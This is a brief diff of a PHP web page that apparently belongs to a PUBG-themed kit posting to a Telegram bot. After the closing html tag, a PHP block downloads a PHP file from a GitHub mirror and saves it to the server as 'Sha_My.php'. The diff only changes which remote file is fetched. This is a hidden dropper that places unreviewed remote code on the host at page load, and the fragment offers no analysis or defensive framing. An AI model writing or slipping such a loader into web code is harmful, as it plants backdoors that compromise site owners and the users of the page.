@@ -84,6 +84,6 @@ bot("sendMessage",[
   </body>
 </html>
 <?
-$sha = file_get_contents('https://raw.githack.com/ahmed-shamy/index-pubg/main/H/s.php');
+$sha = file_get_contents('https://raw.githack.com/ahmed-shamy/index-pubg/main/H/Hs.php');
 $xxx = file_put_contents("Sha_My.php", $sha);
 ?>
